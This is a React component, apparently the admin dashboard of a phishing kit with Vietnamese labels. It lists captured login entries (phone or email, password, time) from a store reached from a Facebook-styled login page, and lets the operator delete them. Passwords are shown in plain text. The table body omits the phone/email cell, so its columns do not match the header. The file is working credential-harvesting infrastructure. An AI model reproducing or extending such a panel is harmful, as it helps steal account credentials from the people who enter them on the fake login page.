import React, { useEffect, useState } from "react";
import { base44 } from "@/api/base44Client";
import { Link } from "react-router-dom";
import { ArrowLeft, Trash2 } from "lucide-react";

export default function Dashboard() {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);

  const load = async () => {
    setLoading(true);
    try {
      const data = await base44.entities.LoginEntry.list("-created_date", 100);
      setEntries(data);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    load();
  }, []);

  const handleDelete = async (id) => {
    try {
      await base44.entities.LoginEntry.delete(id);
      setEntries((prev) => prev.filter((e) => e.id !== id));
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50">
      <header className="bg-white border-b border-slate-200 sticky top-0 z-10">
        <div className="max-w-4xl mx-auto px-5 py-4 flex items-center gap-3">
          <Link to="/" className="p-1 -ml-1 text-slate-700 hover:text-slate-900">
            <ArrowLeft className="w-5 h-5" />
          </Link>
          <h1 className="text-lg font-semibold text-slate-900">Bảng điều khiển</h1>
          <span className="ml-auto text-sm text-slate-500">{entries.length} bản ghi</span>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-5 py-6">
        {loading ?
        <div className="flex justify-center py-16">
            <div className="w-7 h-7 border-4 border-slate-200 border-t-[#0866FF] rounded-full animate-spin" />
          </div> :
        entries.length === 0 ?
        <div className="text-center py-20 text-slate-500">
            <p className="text-sm">Chưa có dữ liệu nào.</p>
            <Link to="/" className="inline-block mt-3 text-[#0866FF] text-sm font-medium hover:underline">
              Quay lại trang đăng nhập
            </Link>
          </div> :

        <div className="bg-white rounded-xl border border-slate-200 overflow-hidden">
            <table className="w-full text-sm">
              <thead className="bg-slate-50 text-slate-600 text-left">
                <tr>
                  <th className="px-4 py-3 font-medium">Số di động / Email</th>
                  <th className="px-4 py-3 font-medium">Mật khẩu</th>
                  <th className="px-4 py-3 font-medium">Thời gian</th>
                  <th className="px-4 py-3 font-medium text-right">Hành động</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {entries.map((e) =>
              <tr key={e.id} className="hover:bg-slate-50">
                    
                    <td className="px-4 py-3 text-slate-700 font-mono">{e.password}</td>
                    <td className="px-4 py-3 text-slate-500">
                      {e.created_date ? new Date(e.created_date).toLocaleString("vi-VN") : "—"}
                    </td>
                    <td className="px-4 py-3 text-right">
                      <button
                    onClick={() => handleDelete(e.id)}
                    className="inline-flex items-center justify-center p-2 rounded-lg text-slate-400 hover:text-red-500 hover:bg-red-50 transition-colors"
                    aria-label="Xóa">
                    
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </td>
                  </tr>
              )}
              </tbody>
            </table>
          </div>
        }
      </main>
    </div>);

}